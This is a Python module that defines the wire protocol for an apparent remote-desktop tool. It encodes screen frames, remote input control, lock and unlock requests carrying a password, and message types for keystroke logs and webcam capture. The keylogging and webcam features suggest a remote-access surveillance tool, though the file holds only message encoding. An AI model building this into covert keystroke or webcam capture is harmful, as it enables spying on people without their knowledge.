"""
Communication protocol for remote desktop streaming
"""
import struct
import zlib
import json
from enum import IntEnum
from typing import Optional, Tuple

class MessageType(IntEnum):
    """Message types for protocol"""
    SCREEN_FRAME = 1
    DELTA_UPDATE = 2
    HEARTBEAT = 3
    CONFIG = 4
    ERROR = 5
    KEYLOG = 6
    WEBCAM_FRAME = 7
    WEBCAM_START = 8
    WEBCAM_STOP = 9
    WEBCAM_ERROR = 10
    CONTROL_START = 11
    CONTROL_STOP = 12
    CONTROL_INPUT = 13
    DISPLAY_SELECT = 14
    LOCK_STATUS = 15
    UNLOCK_REQUEST = 16
    LOCK_REQUEST = 17

class FrameEncoder:
    """Encodes and decodes screen frames"""
    
    @staticmethod
    def encode_frame(frame_data: bytes, frame_id: int, is_delta: bool = False, 
                    x: int = 0, y: int = 0, width: int = 0, height: int = 0) -> bytes:
        """
        Encode a frame with metadata
        
        Format:
        - Message type (1 byte)
        - Frame ID (4 bytes, big-endian)
        - Is delta (1 byte, 0 or 1)
        - If delta: x, y, width, height (4 bytes each)
        - Data length (4 bytes, big-endian)
        - Compressed data
        """
        msg_type = int(MessageType.DELTA_UPDATE if is_delta else MessageType.SCREEN_FRAME)
        
        # Compress frame data with optimized compression level
        compressed = zlib.compress(frame_data, level=3)  # Reduced from 6 for faster compression
        
        # Build header
        header = struct.pack('!BIB', msg_type, frame_id, 1 if is_delta else 0)
        
        if is_delta:
            header += struct.pack('!IIII', x, y, width, height)
        
        header += struct.pack('!I', len(compressed))
        
        return header + compressed
    
    @staticmethod
    def decode_frame(data: bytes) -> Tuple[MessageType, int, bool, Optional[Tuple[int, int, int, int]], bytes]:
        """
        Decode a frame from bytes
        
        Returns: (message_type, frame_id, is_delta, delta_rect, frame_data)
        """
        if len(data) < 10:
            raise ValueError("Frame data too short")
        
        msg_type = MessageType(data[0])
        frame_id = struct.unpack('!I', data[1:5])[0]
        is_delta = bool(data[5])
        
        offset = 6
        delta_rect = None
        
        if is_delta:
            if len(data) < 22:
                raise ValueError("Delta frame data too short")
            x, y, w, h = struct.unpack('!IIII', data[offset:offset+16])
            delta_rect = (x, y, w, h)
            offset += 16
        
        if len(data) < offset + 4:
            raise ValueError("Frame data incomplete")
        
        data_len = struct.unpack('!I', data[offset:offset+4])[0]
        offset += 4
        
        if len(data) < offset + data_len:
            raise ValueError("Compressed data incomplete")
        
        compressed_data = data[offset:offset+data_len]
        frame_data = zlib.decompress(compressed_data)
        
        return msg_type, frame_id, is_delta, delta_rect, frame_data

class ProtocolHandler:
    """Handles protocol-level operations"""
    
    @staticmethod
    def create_heartbeat() -> bytes:
        """Create a heartbeat message"""
        return struct.pack('!BI', int(MessageType.HEARTBEAT), 0)
    
    @staticmethod
    def create_config(config: dict) -> bytes:
        """Create a configuration message"""
        config_json = json.dumps(config).encode('utf-8')
        return struct.pack('!BI', int(MessageType.CONFIG), len(config_json)) + config_json
    
    @staticmethod
    def create_error(error_msg: str) -> bytes:
        """Create an error message"""
        error_bytes = error_msg.encode('utf-8')
        return struct.pack('!BI', int(MessageType.ERROR), len(error_bytes)) + error_bytes
    
    @staticmethod
    def create_keylog(key_data: str) -> bytes:
        """Create a keylog message"""
        key_bytes = key_data.encode('utf-8')
        return struct.pack('!BI', int(MessageType.KEYLOG), len(key_bytes)) + key_bytes
    
    @staticmethod
    def create_webcam_frame(frame_data: bytes) -> bytes:
        """Create a webcam frame message"""
        compressed = zlib.compress(frame_data, level=3)  # Reduced from 6 for faster compression
        return struct.pack('!BI', int(MessageType.WEBCAM_FRAME), len(compressed)) + compressed
    
    @staticmethod
    def create_control_signal(cmd: str) -> bytes:
        """Create a control signal (START/STOP)"""
        cmd_bytes = cmd.encode('utf-8')
        msg_type = MessageType.CONTROL_START if cmd == "START" else MessageType.CONTROL_STOP
        return struct.pack('!BI', int(msg_type), len(cmd_bytes)) + cmd_bytes
    
    @staticmethod
    def create_control_input(key_type: str, key_code: int, x: int = 0, y: int = 0, 
                            button: int = 0, scroll: int = 0) -> bytes:
        """Create a control input message (keyboard/mouse)"""
        data = json.dumps({
            'type': key_type,  # 'key', 'mouse', 'scroll'
            'key': key_code,
            'x': x,
            'y': y,
            'button': button,
            'scroll': scroll
        }).encode('utf-8')
        return struct.pack('!BI', int(MessageType.CONTROL_INPUT), len(data)) + data
    
    @staticmethod
    def create_lock_status(is_locked: bool, lock_type: str = "standard") -> bytes:
        """Create a lock status message"""
        data = json.dumps({
            'locked': is_locked,
            'type': lock_type  # 'standard', 'secure_desktop', 'unknown'
        }).encode('utf-8')
        return struct.pack('!BI', int(MessageType.LOCK_STATUS), len(data)) + data
    
    @staticmethod
    def create_unlock_request(password: str) -> bytes:
        """Create an unlock request message"""
        data = json.dumps({
            'password': password
        }).encode('utf-8')
        return struct.pack('!BI', int(MessageType.UNLOCK_REQUEST), len(data)) + data
    
    @staticmethod
    def create_lock_request() -> bytes:
        """Create a lock request message"""
        data = json.dumps({}).encode('utf-8')
        return struct.pack('!BI', int(MessageType.LOCK_REQUEST), len(data)) + data
    
    @staticmethod
    def decode_message(data: bytes) -> Tuple[MessageType, bytes]:
        """Decode any protocol message"""
        if len(data) < 5:
            raise ValueError("Message data too short")
        msg_type = MessageType(data[0])
        data_len = struct.unpack('!I', data[1:5])[0]
        if len(data) < 5 + data_len:
            raise ValueError("Message data incomplete")
        msg_data = data[5:5+data_len]
        
        # Decompress if it's a webcam frame
        if msg_type == MessageType.WEBCAM_FRAME:
            msg_data = zlib.decompress(msg_data)
        
        return msg_type, msg_data